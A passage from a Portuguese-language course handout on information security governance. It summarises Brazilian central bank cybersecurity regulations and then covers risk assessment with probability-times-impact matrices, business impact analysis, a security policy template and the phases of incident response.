segurança da informação das organizações sob sua jurisdição, garantindo que 
os dados financeiros e as operações sejam protegidos contra ameaças 
cibernéticas. 
 
Principais normas do BACEN relacionadas à segurança da informação 
 
• Resolução CMN 4.658/2018 
o O que é? Esta resolução estabelece requisitos para a contratação 
de serviços de processamento, armazenamento de dados e 
computação em nuvem, além de definir diretrizes para a 
implementação de políticas de segurança cibernética. 
o Diretrizes: 
(a) As instituições financeiras devem adotar políticas de segurança 
cibernética robustas, com planos de resposta a incidentes 
cibernéticos. 
(b) Devem realizar avaliações periódicas de riscos relacionados à 
segurança da informação, incluindo o uso de serviços de 
terceiros. 
(c) A contratação de serviços de computação em nuvem e 
processamento de dados deve ser feita com fornecedores que 
garantam conformidade com as políticas de segurança e 
privacidade estabelecidas pela instituição. 
(d) As instituições são obrigadas a manter registros detalhados das 
medidas de segurança adotadas e a realizar auditorias 
regulares para garantir a conformidade. 
 
• Circular BACEN 3.909/2018 
 

 
 
o O que é? Complementa a Resolução CMN 4.658/2018 ao detalhar 
os requisitos mínimos para a implementação de políticas de 
segurança cibernética nas instituições financeiras. 
 
o Diretrizes: 
(a) Estabelece a necessidade de políticas de segurança 
cibernética que cubram aspectos como a proteção dos dados, 
a resiliência dos sistemas e a resposta a incidentes. 
(b) Define a obrigatoriedade de reportar incidentes relevantes de 
segurança ao BACEN e outras autoridades competentes, bem 
como ao público, quando necessário. 
(c) Impõe a implementação de controles de segurança específicos 
para proteger as informações sensíveis contra acessos não 
autorizados, manipulação ou vazamento. 
 
• Resolução CMN 4.893/2021 
 
o O que é? Estabelece diretrizes para a criação de uma política 
institucional de segurança cibernética em instituições autorizadas 
a funcionar pelo BACEN. 
 
o Diretrizes: 
(a) Obriga as instituições financeiras a desenvolverem uma política 
formal de segurança cibernética, alinhada às melhores práticas 
do mercado e à regulamentação vigente. 
(b) A política deve incluir procedimentos para a prevenção, 
detecção, resposta e recuperação de incidentes de segurança 
cibernética. 
(c) As instituições são obrigadas a realizar testes periódicos de 
vulnerabilidade e avaliação da eficácia das políticas e 
procedimentos implementados. 
 
Como essas diretrizes influenciam as políticas de segurança da informação? 
 
1. Estruturação das políticas de segurança 
• As diretrizes do BACEN exigem que as instituições financeiras 
desenvolvam políticas de segurança da informação estruturadas e 
abrangentes. Essas políticas devem abordar a proteção de dados, a 
segurança cibernética, a gestão de riscos e a resposta a incidentes, 
garantindo que todas as áreas críticas sejam cobertas. 
 
• A conformidade com as normas do BACEN força as organizações a 
adotarem padrões elevados de segurança, o que eleva o nível geral de 
proteção dentro do setor financeiro. 
 
2. Gestão de riscos e controles internos 
 
• As regulamentações do BACEN enfatizam a importância de uma gestão 
de riscos robusta. As instituições financeiras são obrigadas a identificar, 
avaliar e mitigar riscos relacionados à segurança da informação, incluindo 
os riscos associados ao uso de serviços de terceiros. 

 
 
 
• Isso leva as organizações a implementar controles internos rigorosos, 
como monitoramento contínuo, auditorias regulares e avaliações de 
vulnerabilidades, para garantir que os riscos sejam gerenciados de 
maneira eficaz. 
 
3. Resposta a incidentes de segurança 
 
• As políticas de segurança da informação das instituições financeiras 
devem incluir planos detalhados de resposta a incidentes, conforme 
exigido pelo BACEN. Isso inclui a capacidade de detectar e responder 
rapidamente a incidentes cibernéticos, minimizar seu impacto e restaurar 
as operações normais. 
 
• Além disso, as instituições devem relatar incidentes relevantes ao 
BACEN, o que promove a transparência e a responsabilidade no 
tratamento de eventos de segurança. 
 
4. Conformidade e auditoria 
 
• As normas do BACEN exigem que as instituições financeiras mantenham 
registros detalhados de suas práticas de segurança e realizem auditorias 
regulares para verificar a conformidade com as regulamentações. Isso 
implica na necessidade de uma documentação rigorosa e de processos 
de auditoria contínuos, que ajudam a garantir que as políticas de 
segurança sejam seguidas e que as falhas sejam identificadas e 
corrigidas rapidamente. 
 
5. Proteção de dados pessoais e sensíveis 
 
• O BACEN também exige que as instituições financeiras adotem medidas 
específicas para proteger os dados pessoais e sensíveis de seus clientes. 
Isso inclui a implementação de controles de acesso, criptografia de dados 
e a adoção de medidas de segurança para proteger informações durante 
o processamento e armazenamento. 
• Essas exigências moldam diretamente as políticas de segurança da 
informação, garantindo que a privacidade dos dados dos clientes seja 
uma prioridade. 
 
6. Adaptação às novas tecnologias 
 
• As diretrizes do BACEN incentivam as instituições financeiras a estarem 
preparadas para enfrentar os desafios das novas tecnologias, como a 
computação em nuvem e a digitalização de serviços. As políticas de 
segurança da informação devem ser flexíveis e adaptáveis, permitindo a 
integração segura de novas tecnologias e a mitigação dos riscos 
associados. 
 
 
 

 
 
As diretrizes de segurança estabelecidas pelo BACEN desempenham um papel 
crucial na definição das políticas de segurança da informação das instituições 
financeiras no Brasil. Essas regulamentações exigem que as organizações 
adotem práticas de segurança cibernética rigorosas, gerenciem riscos de forma 
proativa e estejam preparadas para responder a incidentes de maneira eficaz. 
Ao garantir a conformidade com essas diretrizes, as instituições financeiras não 
apenas protegem os dados e sistemas críticos, mas também contribuem para a 
estabilidade e a confiança no sistema financeiro como um todo. 
 
Referência: https://www.bcb.gov.br/ 
 
 
 
Observe que indiferente de uma norma, lei ou regulação, existe um foco comum 
em proteção de dados e ativos, visando sempre a garantia e cumprimento dos 
princípios 
básicos 
de 
segurança: 
Confidencialidade, 
Integridade 
e 
Disponibilidade, além de focar em questões como responsabilidades e 
conformidades. Apesar da gradativa complexidade sendo aprofundada, sempre 
as questões de segurança giram em torno dos mesmos pilares fundamentais. 
 
 

 
 
 
UNIDADE 3 GESTÃO DE RISCOS 
 
Nesta unidade, vamos explorar meios e maneiras de avaliar riscos operacionais 
e corporativos, identificar ativos e mapear potenciais ameaças. Vamos entender 
como é importante ter esse entendimento para conseguir priorizar determinadas 
ações na empresa, discutir o apetite ao risco dos problemas de segurança 
corporativos e como isso conecta com uma área de governança de segurança. 
 
OBJETIVOS DA UNIDADE 3 
 
Ao final dos estudos, você deverá ser capaz de: 
 
• Identificar riscos operacionais; 
 
• Calcular riscos operacionais; 
 
• Mapear ativos e ameaças; 
 
• Usar métodos para identificar riscos operacionais. 
 
 

 
 
 
3.1. AVALIAÇÃO DE RISCOS 
 
Antes de avaliarmos os riscos e aprender a mapeá-los e calculá-los, vamos fazer 
uma breve introdução a Gestão de Riscos. 
 
A gestão de riscos é fundamental para identificar, avaliar e mitigar ameaças que 
possam comprometer a segurança da informação em uma organização. Ela 
permite que as empresas tomem decisões informadas sobre como proteger seus 
ativos de informação contra uma ampla gama de ameaças, desde ataques 
cibernéticos até falhas operacionais e desastres naturais. A gestão de riscos é 
um componente crucial das políticas de segurança da informação, garantindo 
que as organizações estejam preparadas para enfrentar e minimizar os impactos 
de possíveis incidentes. 
 
Dentre seus processos, gestão de riscos no contexto de segurança da 
informação visa identificar, avaliar e controlar ameaças potenciais a uma 
organização. Essas ameaças podem originar-se de várias fontes, incluindo 
incertezas financeiras, responsabilidades legais, erros de gerenciamento 
estratégico, acidentes e desastres naturais, além de ameaças de segurança 
cibernética como ataques de hackers, malware e violações de dados. 
 
 
 
Tendo esse entendimento prévio, a avaliação de riscos operacionais e 
corporativos é crucial para minimizar incertezas e impactos que possam 
comprometer os objetivos da organização. Ela envolve identificar, avaliar, 
monitorar e mitigar riscos, protegendo ativos e garantindo conformidade com 
regulamentações. 
 
Os tipos de riscos corporativos podem mudar de corporação para corporação, e 
fatores como geografia e variáveis da natureza podem influenciar, mas 
costumam ser as mesmas premissas, tais como: 
 
• 
Fraudes; 
• 
Falhas de segurança; 
• 
Falhas humanas (propositais ou não propositais); 
• 
Falhas nos sistemas; 
• 
Interrupção de operações; 
• 
Danos a ativos físicos. 
 
Para uma análise de risco mais assertiva, estes passos podem ser úteis: 
 
1) Identifique o risco: liste todos os riscos operacionais potenciais; 
2) Avalie a probabilidade: classifique a probabilidade de ocorrência de cada 
risco usando a escala fornecida; 
3) Avalie o impacto: classifique o impacto de cada risco usando a escala 
fornecida; 
4) Calcule o risco: multiplique a probabilidade pelo impacto para obter a 
pontuação de risco 

 
 
5) Classifique o risco: utilize a matriz de risco para determinar a categoria de 
risco (baixo, médio, alto, crítico). 
 
Escalas de Avaliação: 
 
 
 
Figura 3.1: Avaliação de probabilidade de o risco acontecer 
 
 
 
Figura 3.2: Avaliação do impacto do risco ao negócio 
 
 
Considerando as duas tabelas acima, leve em consideração que, risco 
operacional ou corporativo nada mais é que: 
 
RISCO = PROBABILIDADE X IMPACTO 
 
Levando em consideração esse cálculo, alguns cálculos podem ser feitos, 
considerando os exemplos abaixo para mapear criticidade e pontuação, 
indicadores que são cruciais para discussões com lideranças, diretorias e o 
board da companhia: 
 
 
Figura 3.3: Tabela de cálculo de riscos, pautada no cálculo de probabilidade x 
impacto. 
 

 
 
Levando essa tabela em consideração, faça você alguns exercícios 
considerando diferentes cenários, tais como os exemplos a seguir:  
 
• 
Ataques cibernéticos devido a falhas de segurança; 
• 
Vazamento de dados devido a falha de sistema; 
• 
Comprometimento da operação por ransomware devido a erro humano. 
 
Quais conclusões de riscos operacionais você chegou? 
 
Leve ainda em consideração, que uma matriz de risco será um instrumento 
importante para análises, discussões de apetite de risco com a companhia e 
fornecer diretrizes para um GSI e/ou políticas de segurança. 
 
Além disso, matrizes de risco darão insumos importantes para planos de ação 
para trabalhar com a redução da probabilidade e/ou impacto dos riscos 
identificados, e ser uma foto de um período de análise de riscos, conforme 
mudanças no ambiente operacional da companhia. 
 
 
 
Figura 3.4: Tabela de uma matriz de risco. 
 
 
Interpretação das categorias de risco: 
 
Baixo: requer monitoramento regular, mas não necessita de ações imediatas; 
Médio: precisa de ações para mitigar o risco e deve ser monitorado 
continuamente; 
Alto: necessita de ações imediatas para reduzir o risco e evitar grandes 
impactos; 
Crítico: ações urgentes e drásticas são necessárias para controlar o risco. 
 
3.2. IDENTIFICAÇÃO DE ATIVOS E AMEAÇAS 
 
Identificação de ativos 
 
Para identificar riscos, é essencial compreender os ativos da empresa. Isso inclui 
mapear: 
• Processos operacionais críticos para o negócio;  
• Sistemas críticos e suas funcionalidades; 
• Infraestrutura física e todos ativos críticos da companhia, incluindo 
datacenters, servidores, redes etc.; 

 
 
• Pessoas fundamentais para a operação, bem como o conhecimento 
especializado; 
• Propriedade intelectual, fornecedores e equipamentos. 
 
Identificação de ameaças 
 
As ameaças vão estar associadas aos ativos que a empresa ou você possui. 
Isso inclui ameaças: 
• Internas (erro humano, fraude, falhas de sistemas); 
• Externas (ataques cibernéticos, desastres naturais, roubo); 
• Ambiente de negócios (mudanças regulatórias, flutuações de mercado); 
• Relacionadas a fornecedores e terceiros (interrupção de serviços, 
problemas de qualidade). 
 
 

 
 
 
Business Impact Analysis 
 
Existe um processo chamado Business Impact Analysis, ou BIA, que consiste 
em identificar e avaliar o potencial impacto proveniente de interrupções de parte 
ou toda a operação da companhia. Muito utilizado para avaliar sistemas e 
processos críticos da companhia, o BIA ajuda a mapear ativos e ameaças, bem 
como é um excelente guia para um Plano de Continuidade de Negócios (PCN). 
 
O BIA é um processo essencial no gerenciamento de riscos e continuidade de 
negócios, que consiste em identificar e avaliar os potenciais impactos de uma 
interrupção nas operações de uma empresa. O objetivo principal do BIA é 
entender as consequências das interrupções nos processos críticos e, com base 
nisso, estabelecer prioridades e estratégias para minimizar os efeitos negativos 
sobre a organização. 
 
Importância do BIA: O BIA é fundamental para preparar uma empresa para 
enfrentar eventos inesperados, como desastres naturais, falhas de sistemas, 
ataques cibernéticos ou qualquer outro tipo de incidente que possa interromper 
a operação normal. Sem uma análise detalhada do impacto desses eventos, a 
empresa pode não estar adequadamente preparada para responder a crises, 
resultando em perdas financeiras, danos à reputação e até mesmo na 
paralisação prolongada das operações ou todo o negócio. 
 
Etapas do Business Impact Analysis 
 
1. Identificação dos processos críticos 
 
O primeiro passo do BIA é identificar os processos e atividades que são 
essenciais para o funcionamento da empresa. Estes são os processos que, se 
interrompidos, teriam um impacto significativo nas operações e finanças da 
organização. Exemplos incluem sistemas de TI, operações de manufatura, 
logística, atendimento ao cliente e outros serviços centrais. 
 
2. Avaliação dos impactos 
 
Uma vez identificados os processos críticos, o próximo passo é avaliar os 
impactos potenciais de uma interrupção em cada um deles. Isso inclui calcular 
as perdas financeiras diretas, o impacto sobre os clientes, os danos à reputação 
e as possíveis consequências legais ou regulatórias. Esta avaliação ajuda a 
quantificar o nível de risco associado a cada processo. 
 
3. Definição de prioridades 
 
Com base na avaliação dos impactos, as empresas podem estabelecer 
prioridades para a recuperação. Processos que apresentam maiores riscos ou 
que são essenciais para a continuidade dos negócios são priorizados para 
recuperação em caso de interrupção. Isso ajuda a garantir que os recursos sejam 
alocados de maneira eficiente durante uma crise. 
 
4. Identificação de recursos necessários 

 
 
O BIA também envolve a identificação dos recursos necessários para manter os 
processos críticos em operação durante e após uma interrupção. Isso pode 
incluir infraestrutura de TI, pessoal chave, fornecedores, parceiros externos, e 
outras dependências que são vitais para a recuperação rápida. 
 
5. Desenvolvimento de planos de contingência 
 
Com as informações obtidas no BIA, as empresas podem desenvolver planos de 
contingência detalhados. Esses planos delineiam as ações que devem ser 
tomadas para mitigar os impactos de uma interrupção, incluindo planos de 
recuperação de desastres, procedimentos de backup e restauração, 
comunicação durante crises, entre outros. 
 
Benefícios do Business Impact Analysis 
 
• 
Preparação antecipada: o BIA permite que as empresas se preparem de 
forma proativa para interrupções, minimizando os impactos negativos 
sobre as operações. 
• 
Alocação eficiente de recursos: ao identificar processos críticos e 
priorizar ações, as empresas podem alocar recursos de maneira mais 
eficiente durante uma crise. 
• 
Melhoria na resposta a incidentes: com planos de contingência bem 
definidos, a resposta a incidentes torna-se mais rápida e eficaz, reduzindo 
o tempo de inatividade e os custos associados. 
• 
Proteção da reputação: ao garantir a continuidade dos negócios durante 
crises, as empresas protegem sua reputação e mantêm a confiança dos 
clientes e parceiros. 
• 
Conformidade regulamentar: muitas indústrias exigem a realização de 
um BIA como parte das práticas de conformidade. Isso ajuda as empresas 
a atenderem aos requisitos regulatórios e a evitarem penalidades. 
 
 
 
O Business Impact Analysis é uma ferramenta indispensável para a gestão de 
riscos e continuidade de negócios. Ao identificar e avaliar os impactos potenciais 
de interrupções nos processos críticos, o BIA ajuda as empresas a se 
prepararem para eventos inesperados, garantindo que estejam prontas para 
responder de forma eficaz a crises e manter a continuidade das operações. 
Implementar um BIA robusto não apenas protege os ativos e operações da 
empresa, mas também fortalece sua resiliência e competitividade no mercado. 
 
Referência: 
https://pt.wikipedia.org/wiki/Planejamento_de_continuidade_de_neg%C3%B3ci
os 
 
 
 
3.3. MÉTODOS DE MITIGAÇÃO DE RISCOS 
 
Agora que sabemos calcular riscos operacionais, identificar ativos e ameaças, 
vamos conhecer métodos e ferramentas para fazer uma análise sólida de riscos 

 
 
corporativos, dando insumos para uma gestão de riscos eficiente. Um bom guia 
para identificar riscos pode ser este questionário relacionado às etapas da 
gestão dos riscos: 
1. Identificação de Riscos 
o O que é? Identificar todos os possíveis riscos que podem afetar a 
organização. 
o Como fazer? Realizar brainstormings, analisar históricos de 
dados, consultar especialistas etc. 
2. Análise de Riscos 
o O que é? Avaliar a probabilidade e o impacto de cada risco 
identificado. 
o Como fazer? Utilizar matrizes de risco, simulações, análises 
quantitativas e qualitativas. 
3. Avaliação de Riscos 
o O que é? Priorizar os riscos com base na sua probabilidade e 
impacto. 
o Como fazer? Classificar os riscos em categorias (alto, médio, 
baixo) e focar nos mais críticos. 
4. Tratamento de Riscos 
o O que é? Desenvolver estratégias para mitigar, transferir, aceitar 
ou evitar os riscos. 
o Como fazer? Implementar planos de ação, seguros, controles 
internos etc. 
5. Monitoramento e Revisão 
o O que é? Acompanhar continuamente os riscos e a eficácia das 
medidas adotadas. 
o Como fazer? Realizar auditorias, revisões periódicas, relatórios de 
acompanhamento. 
Métodos 
• 
Faça brainstorming com equipes multidisciplinares. 
• 
Use checklists para verificações específicas. 
• 
Entreviste pessoas e stakeholders com questionários (lembre-se do BIA). 
• 
Faça análise de cenários hipotéticos com possíveis ameaças e ativos 
afetados. 
• 
Veja se há incidentes registrados e identifique padrões e vulnerabilidades. 
Ferramentas 
• 
Busque por um inventário de ativos corporativos. 
• 
Faça uma matriz de ameaças correlacionando ativos x ameaças. 
• 
Se possível, tenha mapas de calor mostrando visualmente a 
probabilidade e impacto dos riscos. 
• 
Matriz SWOT: analise as forças, fraquezas, oportunidades e ameaças da 
companhia. 
 
 

 
 
A gestão de riscos é um componente essencial da segurança da informação, 
garantindo que as organizações estejam preparadas para enfrentar ameaças 
potenciais e mitigar seus impactos. Ao adotar uma abordagem sistemática para 
identificar, avaliar, tratar e monitorar riscos, as organizações podem proteger 
seus ativos críticos, assegurar a continuidade dos negócios e manter a 
confiança de seus stakeholders, bem como manter sua reputação no mercado, 
clientes, parceiros e fornecedores. A gestão eficaz de riscos não só fortalece a 
segurança cibernética, mas também contribui para o sucesso e a resiliência a 
longo prazo da organização. 
 
 
 
 
 

 
 
UNIDADE 4 DESENVOLVIMENTO DE POLÍTICAS DE 
SEGURANÇA 
 
Nesta unidade, vamos colocar em prática todos os conhecimentos até aqui 
apresentados, interpretando políticas de segurança da informação e nos 
aprofundaremos em questões objetivas como a estrutura de uma política de 
segurança, para criar, sustentar e dar manutenção em políticas de segurança 
de uma área de governança de segurança. Ao final desta unidade, vamos ter 
uma compreensão básica de como funcionam resposta a incidentes de 
segurança da informação, pois assim como gestão de riscos, esse tema afeta o 
apetite de risco e diretrizes de segurança na empresa. 
 
OBJETIVOS DA UNIDADE 4 
 
Ao final dos estudos, você deverá ser capaz de: 
 
• Criar uma política de segurança a partir de uma estrutura básica; 
 
• Compreender diferentes cenários e a partir deles construir políticas 
específicas; 
 
• Entender como um incidente de segurança funciona. 
 
 
 

 
 
4.1. ESTRUTURA DE UMA POLÍTICA DE SEGURANÇA 
 
As empresas não seguem um modelo oficial, cada uma vai ter sua configuração. 
Mas, objetivamente, as políticas costumam ter uma estrutura parecida com esta: 
Objetivo: introdução onde se declaram as diretrizes e regras da política, 
explicando normalmente os porquês de a política existir. 
Escopo: a quem a política se aplica, incluindo ativos e dados pertencentes ou 
administrados pela empresa. 
Responsabilidades: quem são os responsáveis por aprovar, gerenciar, 
implementar, cumprir as diretrizes da política e zelar pelo cumprimento dela. 
Diretrizes gerais: detalhamento da política em si, com as diretrizes e normas 
que precisam ser cumpridas através da política. 
Controle de revisões: a política deve conter um registro de quem a criou, 
revisou e a atualizou, além de ter um registro de datas da periodicidade em que 
ela sofre alterações. 
Conformidade e sanções: período de vigência, ciência da política pelos 
funcionários da empresa e eventuais implicações das violações das normas nela 
contida, podendo ser ações disciplinares, advertências, demissões etc. 

 
 
Leve em consideração esse modelo e exemplo, que pode ser útil na construção 
de uma política: 
 
 
Objetivo 
 
Estabelecer diretrizes e regras para garantir a confidencialidade, integridade 
e disponibilidade das informações da empresa. 
Escopo 
 
Aplicável a todos os funcionários, prestadores de serviço, parceiros e 
terceirizados com acesso aos ativos de informação da empresa. 
Responsabilidades 
 
Conselho de Administração: Aprova a política. 
Gerência de TI: Gerencia e implementa a política. 
Equipe de Segurança: Monitora o cumprimento. 
Colaboradores: Cumprem as diretrizes e reportam incidentes. 
Diretrizes Gerais  
 
Esta política de exemplo tem como objeto declarar que seja feito controle 
apropriado de confidencialidade, integridade e disponibilidade em todos os 
ativos da companhia, conforme previsto na norma ISO/IEC 27002, parágrafo 
XPTO. 
 
O detalhamento deste controle prevê... a adoção desta política contempla 
que... convém que seja feita manutenções periódicas de... etc. 
 
Detalhe objetivamente as mensagens que você precisa transmitir na política, 
embase as diretrizes em normas ou legislações. Se aplicável, cite que a 
política é para cumprir requisitos de conformidade.  
 
Seja objetivo e direto ao ponto, evite ambiguidades nas políticas e revise o 
texto dela periodicamente de maneira que não haja dúvidas sobre ela, e que 
está condizente com a realidade da empresa e/ou regulamentações vigentes. 
Controle de Revisões 
 
 
Conformidade e Sanções 
 
A política entra em vigor a partir da data desta publicação. Todos devem 
estar cientes e cumprir as diretrizes. Violações podem resultar em 
advertências, suspensão ou demissão. 
Tabela 4.1: Template de uma política de segurança da informação 
 

 
 
Mais uma vez: seja objetivo, evite ambiguidades, evite textos com escopos muito 
vagos ou abertos de maneira que abra margem para brechas. Use referências 
de normas, leis e regulações para endossar as diretrizes a serem seguidas na 
sua política. Entenda com o negócio quais as sanções do não cumprimento das 
políticas. 
 
4.2. CRIAÇÃO DE POLÍTICAS ESPECÍFICAS 
 
As políticas de segurança da informação podem abranger diferentes assuntos, 
em diferentes contextos e áreas, como: backup, firewall, criptografia, controles 
de acesso, senhas fortes, mesa limpa, governança de dados, políticas de 
desenvolvimento seguro ou simplesmente uma política geral de segurança da 
informação a nível organizacional. 
O roteiro a seguir serve como uma base para conseguir preparar uma política 
de segurança a partir do template apresentado: 
 
1. Entenda as necessidades 
o O que precisa ser protegido? Quais ativos? Os riscos nesse 
contexto foram avaliados? 
o Quais são os objetivos? 
o Qual o nível de proteção necessário? Tem alguma lei ou 
regulamentação que precisa estar em conformidade? 
2. Definição de controles 
o Quem vai ter acesso a quais tipos de informações? 
o Quais recursos ou ativos serão usados? 
o Quem precisa ser conscientizado e treinado periodicamente? 
3. Implementação 
o Quem vai aplicar e quem vai seguir a política? 
o Como se certificar que as políticas são claramente comunicadas 
para todos? 
4. Monitoramento 
o As políticas estão sendo revisadas e atualizadas periodicamente? 
o Haverá auditorias regulares? 
Lembre-se: existem políticas específicas para gestão de riscos, plano de 
continuidade de negócio, resposta a incidentes, privacidade, mas todas elas 
podem se correlacionar com políticas de segurança e existem normas que 
correlacionam esses assuntos, portanto sempre as cite em suas políticas.  
 
Exemplo: foi escrita uma política de segurança para mitigar um risco operacional 
relacionado a potencial vazamento de dados a partir de um sistema crítico ao 
negócio. Você sabe que é um sistema legado, que ao atualizá-lo para resolver a 
vulnerabilidade provavelmente esse sistema vai parar de funcionar e gerar 
prejuízos financeiros incalculáveis para a companhia, mas não resolver esse 
risco também pode ocasionar uma multa milionária vinda da LGPD. Você sabe 
também que a política da maneira como ela é hoje não é suficiente para mitigar 
esse risco, pois ela é desatualizada, fala de controles de segurança de uma 
maneira muito subjetiva e precisa de uma atualização urgente. 
 

 
 
Saída: declarar para companhia que, para esse sistema crítico, ela precisa de 
controles e uso de segurança em camadas, isolando esse sistema em uma rede 
com acesso restrito, colocar firewalls e soluções de IDS (Intrusion Detection 
System) e DLP (Data Loss Prevention) para controlar e monitorar 
respectivamente o tráfego dessa rede, aplicar hardening no banco de dados do 
sistema para evitar exfiltração de dados, revisar os acessos das pessoas no 
sistema, entre outros controles. 
 
Entregável: você atualiza sua política com esses outputs pensando na 
mitigação do risco, e o que ficar desconexo com a política, vira políticas 
adjacentes, como: política de firewall ou perímetro, política de hardening, política 
de acesso com controles periódicos de acessos sistêmicos etc. 
 
Para cada problema, diretriz ou conformidade que você pretende alcançar com 
as políticas de segurança, entenda primeiro o problema ou as necessidades da 
companhia, pense em como você vai estruturar isso na política, e busque sempre 
o embasamento necessário nas normas, frameworks, regulatórios ou leis, pois 
isso sempre vai fortalecer seu discurso e sua política de segurança. 
 
4.3. INTRODUÇÃO À RESPOSTA A INCIDENTES 
 
A resposta a incidentes é o conjunto de procedimentos tomados para a empresa 
detectar, investigar e resolver o incidente (sendo ele de SI ou não). Minimiza 
impactos para restaurar a normalidade da operação o quanto antes. 
Normalmente existem áreas na companhia para atuar e responder incidentes. 
 
Imagem 4.2: Passo a passo de uma resposta de incidentes de segurança 

 
 
Observe a imagem acima relacionando os passos para uma resposta a 
incidentes, não necessariamente restrito a incidente de segurança. Neste passo 
a passo, observe que existem algumas etapas até a contenção e correção do 
incidente de segurança. Entretanto, é na etapa de lições aprendidas - onde 
costumam sair planos de ação, próximos passos e mudanças significativas para 
que o incidente de segurança não ocorra mais – que saem diretrizes importantes 
que podem ser direcionadores ou mudar sensivelmente algumas diretrizes de 
segurança. Apesar de existir políticas de resposta a incidentes, esteja sempre 
atento a gestão de incidentes da sua companhia para manter sua política, 
diretrizes e procedimentos atualizados e coerentes com a realidade da empresa. 
Por que é importante? 
• 
Existem políticas específicas para lidar com resposta a incidentes. 
• 
Lições aprendidas podem mudar a forma de operar, e por consequência 
alterar políticas de segurança. 
• 
Riscos corporativos normalmente têm relação com incidentes. 
• 
Nem toda empresa vai ter uma área de RI (Resposta a Incidentes) ou 
SOC (Security Operation Center) ou NOC (Network Operation Center). 
 
Agora que entendemos de maneira resumida Resposta a Incidentes, vamos 
entender de maneira mais aprofundada Gestão de Incidentes e como se conecta 
com políticas de segurança e área de GRC na companhia. 
 
A gestão de incidentes de segurança é um processo essencial no contexto das 
políticas de segurança da informação, pois garante que as organizações estejam 
preparadas para responder de maneira eficaz a eventos que possam 
comprometer a confidencialidade, integridade e disponibilidade de seus ativos 
de informação. Um incidente de segurança pode incluir uma ampla gama de 
eventos, desde ataques cibernéticos e violações de dados até falhas de sistema 
e erros humanos. A gestão eficaz desses incidentes é crucial para minimizar o 
impacto sobre a organização e garantir a continuidade das operações. 
 
Gestão de Incidentes em detalhes 
 
A gestão de incidentes de segurança é a área ou disciplina responsável em 
segurança da informação por responder incidentes de segurança, como vimos 
acima. Isso inclui a detecção de incidentes, a análise para determinar a 
gravidade e o impacto, a resposta coordenada para conter e resolver o incidente, 
e a implementação de medidas para prevenir a recorrência. 
 
Detalhamento das fases de RI 
 
1. Preparação 
 
O que é? A preparação é a fase inicial em que a organização se prepara para 
possíveis incidentes de segurança, garantindo que as políticas, procedimentos 
e recursos necessários estejam prontos para uma resposta eficaz. 
 

 
 
Principais Atividades: 
• 
Desenvolver e manter um plano de resposta a incidentes que inclui papéis 
e responsabilidades claramente definidos. 
• 
Estabelecer e treinar uma equipe de resposta a incidentes (IRT) com 
membros de diferentes departamentos, como TI, jurídico, comunicação e 
RH. 
• 
Implementar ferramentas e tecnologias para monitoramento contínuo e 
detecção de incidentes. 
• 
Realizar treinamentos regulares e simulações de incidentes para garantir 
que todos os membros da equipe saibam como responder rapidamente a 
um incidente real. 
 
Importância: a preparação adequada ajuda a reduzir o tempo de resposta a 
incidentes e garante que a organização esteja pronta para mitigar qualquer 
ameaça que possa surgir. 
 
2. Identificação 
 
O que é? A identificação envolve a detecção e o reconhecimento de que um 
incidente de segurança está ocorrendo ou ocorreu. 
 
Principais Atividades: 
• 
Monitorar sistemas e redes em tempo real para sinais de atividades 
anômalas ou suspeitas. 
• 
Analisar alertas de segurança gerados por sistemas de detecção de 
intrusões (IDS), Endpoint Detection and Response (EDR), Data Loss 
Prevention (DLP), firewalls e outras ferramentas ou fontes de segurança. 
• 
Relatar possíveis incidentes de segurança à equipe de resposta a 
incidentes para uma investigação imediata. 
 
Importância: a identificação precoce de um incidente é crucial para limitar seu 
impacto e evitar que ele se espalhe para outras áreas da organização. 
 
3. Análise 
 
O que é? A análise é o processo de investigar o incidente para entender sua 
natureza, escopo e impacto. 
 
Principais Atividades: 
• 
Coletar e examinar dados de registros de sistema, relatórios de segurança 
e outras fontes relevantes para determinar a origem e o vetor do ataque. 
• 
Avaliar o impacto do incidente em termos de dados comprometidos, 
sistemas afetados e possíveis implicações legais. 
• 
Determinar a gravidade do incidente e priorizar as ações de resposta com 
base no impacto identificado. 
Importância: a análise detalhada do incidente permite que a equipe entenda a 
extensão do problema e tome decisões informadas sobre como responder de 
maneira eficaz. 
 
 
 

 
 
 
 
4. Contenção 
 
O que é? A contenção envolve ações para limitar o impacto do incidente e 
impedir que ele cause mais danos à organização. 
 
Principais Atividades: 
• 
Isolar sistemas comprometidos para evitar que o incidente se espalhe 
para outras partes da rede. 
• 
Implementar soluções temporárias, como bloquear contas de usuário 
comprometidas ou aplicar filtros adicionais de rede. 
• 
Decidir sobre contenção de curto prazo (ação imediata para mitigar o 
impacto) e contenção de longo prazo (soluções mais duradouras que 
podem envolver a reconfiguração de sistemas). 
 
Importância: a contenção rápida é essencial para minimizar o impacto do 
incidente e proteger os ativos críticos da organização. 
 
5. Correção 
 
O que é? A correção envolve a eliminação da causa raiz do incidente e a 
restauração dos sistemas afetados ao seu estado normal. 
 
Principais Atividades: 
• 
Remover qualquer software malicioso ou limpar qualquer código 
comprometido dos sistemas afetados. 
• 
Corrigir vulnerabilidades exploradas durante o incidente, como aplicar 
patches de segurança ou fortalecer configurações de segurança. 
• 
Restaurar sistemas a partir de backups seguros e verificar que todos os 
dados restaurados estão íntegros e livres de comprometimento. 
 
Importância: a correção completa garante que a organização elimine a ameaça 
e retorne à operação normal sem o risco de uma recorrência imediata do 
incidente. 
 
6. Lições Aprendidas 
 
O que é? A etapa de lições aprendidas envolve uma revisão pós-incidente para 
identificar o que funcionou bem, o que precisa ser melhorado e como a 
organização pode fortalecer suas defesas para o futuro. 
 
Principais Atividades: 
• 
Realizar uma reunião de retrospectiva com todos os envolvidos na 
resposta ao incidente para discutir o que aconteceu, as ações tomadas e 
os resultados. 
• 
Documentar todas as descobertas, incluindo os pontos fortes e fracos da 
resposta ao incidente. 
• 
Atualizar as políticas, procedimentos e planos de resposta a incidentes 
com base nas lições aprendidas para melhorar a eficácia das respostas 
futuras. 

 
 
• 
Oferecer treinamento adicional, se necessário, para abordar quaisquer 
lacunas identificadas no processo de resposta. 
 
Importância: aprender com incidentes passados é essencial para fortalecer a 
resiliência da organização e melhorar continuamente sua postura de segurança 
cibernética. 
 
Importância da Gestão e Resposta a Incidentes nas políticas de segurança da 
informação 
 
Minimização de Impactos 
 
A gestão eficaz de incidentes de segurança ajuda a minimizar o impacto de 
eventos adversos sobre a organização. Isso inclui a redução do tempo de 
inatividade, a minimização das perdas financeiras e a proteção da reputação da 
empresa. 
 
Proteção de Dados e Ativos 
 
As políticas de gestão de incidentes garantem que os dados e outros ativos de 
informação sejam protegidos durante um incidente de segurança. Isso inclui a 
contenção de violações de dados, a proteção contra destruição ou alteração de 
